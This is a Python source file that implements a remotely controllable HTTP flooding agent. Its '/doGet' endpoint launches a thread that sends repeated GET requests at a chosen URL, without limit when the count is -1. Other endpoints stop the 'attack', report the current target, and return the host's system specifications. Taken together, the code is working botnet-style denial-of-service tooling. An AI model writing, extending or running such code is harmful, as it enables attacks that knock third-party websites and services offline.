import json
import platform
import threading
import psutil
from http.server import BaseHTTPRequestHandler
import requests


def get_size(bytes, suffix="B"):
    """
    Scale bytes to its proper format
    e.g:
        1253656 => '1.20MB'
        1253656678 => '1.17GB'
    """
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes < factor:
            return f"{bytes:.2f}{unit}{suffix}"
        bytes /= factor


class HTTPServerRH(BaseHTTPRequestHandler):
    target = ""
    action = "waiting"
    event = threading.Event()


    def do_GET(self):
        if self.path == "/status":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        if self.path == "/stopAttack":
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.event.set()
            self.target = ""
            self.action = "waiting"
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return
        elif self.path == "/getSystemInfo":
            self.target = ""
            self.action = "System info"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            try:
                uname = platform.uname()
                svmem = psutil.virtual_memory()
                partition = psutil.disk_partitions()
                message = {
                    "System": uname.system,
                    "Node name": uname.node,
                    "Release": uname.release,
                    "Version": uname.version,
                    "Machine": uname.machine,
                    "Processor": platform.processor(),
                    "Physical cores": psutil.cpu_count(logical=False),
                    "Total cores": psutil.cpu_count(logical=True),
                    "Memory": get_size(svmem.total),
                }
                self.wfile.write(json.dumps(message).encode('utf-8'))
            except Exception as e:
                print(e)
                pass
            return

    def do_POST(self):
        if self.path == "/doGet":
            contentLength = int(self.headers['Content-Length'])
            postData = self.rfile.read(contentLength).decode("utf-8")
            req = json.loads(postData)
            self.target = req["url"]
            self.action = "Get " + str(req["time"]) + " times"
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            try:
                p = threading.Thread(target=self.doRequest, args=(req["url"], int(req["time"])))
                p.daemon = True
                p.start()
            except Exception as e:
                print(e)
            message = {"target": self.target, "action": self.action}
            self.wfile.write(json.dumps(message).encode('utf-8'))
            return

    def doRequest(self, url, time):
        i = 0
        while (i < time or time == -1) and not self.event.is_set():
            try:
                print("Doing request at ", url)
                response = requests.get(url)
            except Exception as e:
                print("Request error: ", e)
            if time != -1:
                i += 1
        self.event.clear()
